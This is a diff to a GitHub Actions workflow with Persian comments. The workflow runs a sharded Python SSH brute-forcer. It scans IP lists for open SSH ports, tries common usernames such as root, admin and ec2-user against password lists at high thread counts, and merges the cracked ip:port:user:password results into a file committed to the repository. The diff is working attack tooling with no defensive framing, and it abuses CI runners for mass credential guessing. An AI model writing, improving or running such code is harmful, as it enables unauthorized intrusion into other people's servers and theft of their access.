@@ -52,18 +52,17 @@ jobs:
           TEST_THREADS = int(os.environ.get('TEST_THREADS', 1000))
           TIMEOUT = int(os.environ.get('TIMEOUT', 1))
           SSH_PORTS = [22, 2222, 22222, 2200, 222]
-          CRED_FILE = f"found_creds_shard_{SHARD_ID}.txt"
-          REPORT_FILE = f"scan_report_shard_{SHARD_ID}.txt"
+          RESULT_FILE = f"shard_{SHARD_ID}_result.json"
 
           def main():
               try:
                   run()
               except Exception as e:
-                  with open(f"error_shard_{SHARD_ID}.log", "w") as f:
-                      f.write(f"CRITICAL ERROR: {e}\n{traceback.format_exc()}")
-                  os.system(f"git add error_shard_{SHARD_ID}.log && git commit -m 'Shard {SHARD_ID} error' && git push 2>/dev/null || true")
-                  print(f"💥 خطای بحرانی: {e}")
-                  sys.exit(1)
+                  # ذخیره خطا در فایل JSON و خروج با موفقیت برای ادامه ادغام
+                  with open(RESULT_FILE, 'w') as f:
+                      json.dump({"error": str(e), "traceback": traceback.format_exc()}, f)
+                  print(f"💥 خطای بحرانی در شارد {SHARD_ID}: {e}")
+                  sys.exit(0)  # خروج موفق برای ادامه کار
 
           def run():
               with open('task_list.json') as f:
@@ -75,6 +74,7 @@ jobs:
               scan_start = time.time()
               print(f'🔥 شارد {SHARD_ID}: {len(ips)} آیپی | {len(passwords)} پسورد | {TEST_THREADS} نخ')
 
+              # ----- اسکن پورت -----
               ssh_targets = []
               def check_ssh(ip, port):
                   try:
@@ -99,12 +99,12 @@ jobs:
               print(f'✅ {len(ssh_targets)} سرور SSH در {scan_time:.1f} ثانیه پیدا شد')
               
               if not ssh_targets:
-                  with open(REPORT_FILE, 'w') as f:
-                      f.write(f"Shard {SHARD_ID} Report\nNo targets found\n")
-                  os.system(f'git add {REPORT_FILE} && git commit -m "Shard {SHARD_ID} empty" && git push 2>/dev/null || true')
+                  with open(RESULT_FILE, 'w') as f:
+                      json.dump({"status": "no_targets", "ips_scanned": len(ips)}, f)
                   print('بدون هدف، پایان')
-                  return  # با کد موفقیت 0 تمام می‌شود
+                  return
 
+              # ----- تست اعتبارنامه -----
               usernames = ['root', 'admin', 'ubuntu', 'ec2-user', 'azureuser', 'centos', 'debian', 'vagrant', 'pi', 'oracle']
               cache_file = Path('cache') / f'dominator_cache_shard_{SHARD_ID}.json'
               cache_file.parent.mkdir(exist_ok=True)
@@ -152,28 +152,28 @@ jobs:
               asyncio.run(hunt())
               test_time = time.time() - test_start
 
-              with open(CRED_FILE, 'w') as f:
-                  for ip, port, user, pwd, _ in successes:
-                      f.write(f'{ip}:{port}:{user}:{pwd}\n')
-              
+              # ذخیره کش برای دور بعد
               with open(cache_file, 'w') as f:
                   json.dump(cache, f)
 
-              with open(REPORT_FILE, 'w') as f:
-                  f.write(f"Shard {SHARD_ID} Report\n")
-                  f.write(f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
-                  f.write(f"IPs Scanned: {len(ips)}\n")
-                  f.write(f"SSH Targets Found: {len(ssh_targets)}\n")
-                  f.write(f"Passwords Tested: {len(passwords)}\n")
-                  f.write(f"Credentials Found: {len(successes)}\n")
-                  f.write(f"Scan Time: {scan_time:.1f}s\n")
-                  f.write(f"Test Time: {test_time:.1f}s\n")
-                  f.write(f"Total Time: {scan_time+test_time:.1f}s\n")
-                  f.write("="*50 + "\n")
-                  for ip, port, user, pwd, _ in successes:
-                      f.write(f"{ip}:{port}:{user}:{pwd}\n")
-
-              os.system(f'git add {CRED_FILE} {REPORT_FILE} {cache_file} && git commit -m "Shard {SHARD_ID} complete" && git push 2>/dev/null || true')
+              # ----- آماده‌سازی خروجی JSON -----
+              result = {
+                  "shard": SHARD_ID,
+                  "status": "completed",
+                  "ips_scanned": len(ips),
+                  "targets_found": len(ssh_targets),
+                  "passwords_tested": len(passwords),
+                  "credentials_found": len(successes),
+                  "scan_time": scan_time,
+                  "test_time": test_time,
+                  "total_time": scan_time + test_time,
+                  "credentials": [f"{ip}:{port}:{user}:{pwd}" for ip, port, user, pwd, _ in successes],
+                  "cache_file": str(cache_file)
+              }
+              
+              with open(RESULT_FILE, 'w') as f:
+                  json.dump(result, f, indent=2)
+              
               total_time = time.time() - scan_start
               print(f'📄 شارد {SHARD_ID} تمام شد. {len(successes)} پیدا شد. کل زمان: {total_time:.1f}s')
 
@@ -255,7 +255,7 @@ jobs:
     name: "Shard ${{ matrix.shard }}"
     needs: prepare
     runs-on: ubuntu-latest
-    continue-on-error: true  # <-- مهم: حتی با خطا هم بقیهٔ شاردها و مرحلهٔ ادغام اجرا شوند
+    continue-on-error: true
     strategy:
       fail-fast: false
       matrix:
@@ -278,37 +278,59 @@ jobs:
           TIMEOUT: ${{ github.event.inputs.timeout }}
         run: python3 scanner.py
 
-      # در صورت وجود خطا، لاگ آن را چاپ کن (برای دیباگ)
-      - name: نمایش لاگ خطا (در صورت وجود)
-        if: failure()
-        run: |
-          if [ -f error_shard_${{ matrix.shard }}.log ]; then
-            echo "محتوای لاگ خطا:"
-            cat error_shard_${{ matrix.shard }}.log
-          else
-            echo "فایل لاگ خطا یافت نشد."
-          fi
+      - name: آپلود نتیجه شارد
+        uses: actions/upload-artifact@v4
+        with:
+          name: shard-${{ matrix.shard }}-result
+          path: shard_${{ matrix.shard }}_result.json
 
   merge:
     needs: scan_shard
     runs-on: ubuntu-latest
-    if: always()  # <-- مهم: حتی اگر شاردها شکست خوردند، این مرحله اجرا شود
+    if: always()
     steps:
       - uses: actions/checkout@v4
       
+      - name: دانلود تمام نتایج شاردها
+        uses: actions/download-artifact@v4
+        with:
+          pattern: shard-*-result
+          path: shard-results
+
       - name: ادغام نهایی
         run: |
-          git pull origin main 2>/dev/null || true
-          echo "📊 جمع‌آوری نتایج..."
-          cat found_creds_shard_*.txt > final_creds.txt 2>/dev/null || echo "بدون نتیجه"
-          cat scan_report_shard_*.txt > full_scan_report.txt 2>/dev/null || echo "بدون گزارش"
+          echo "📊 ادغام نتایج..."
+          > final_creds.txt
+          > full_scan_report.txt
+          
+          for file in shard-results/*/shard_*_result.json; do
+            if [ -f "$file" ]; then
+              echo "پردازش $file"
+              python3 -c "
+          import json
+          with open('$file') as f:
+              data = json.load(f)
+          if 'credentials' in data:
+              for cred in data['credentials']:
+                  with open('final_creds.txt', 'a') as out:
+                      out.write(cred + '\n')
+          with open('full_scan_report.txt', 'a') as rpt:
+              rpt.write(f'Shard {data.get(\"shard\", \"?\")}: {data.get(\"status\", \"unknown\")} - Creds Found: {data.get(\"credentials_found\", 0)}\n')
+              if 'error' in data:
+                  rpt.write(f'Error: {data[\"error\"]}\n')
+              rpt.write('---\n')
+          "
+            fi
+          done
+          
           if [ -s final_creds.txt ]; then
             total=$(wc -l < final_creds.txt)
-            echo "✅ $total اعتبارنامه پیدا شد:"
+            echo "✅ $total اعتبارنامه پیدا شد"
             cat final_creds.txt
           else
             echo "❌ هیچ اعتبارنامه‌ای پیدا نشد"
           fi
+          
           git add final_creds.txt full_scan_report.txt
           git commit -m "Merge all shards - final results" || true
           git push || true
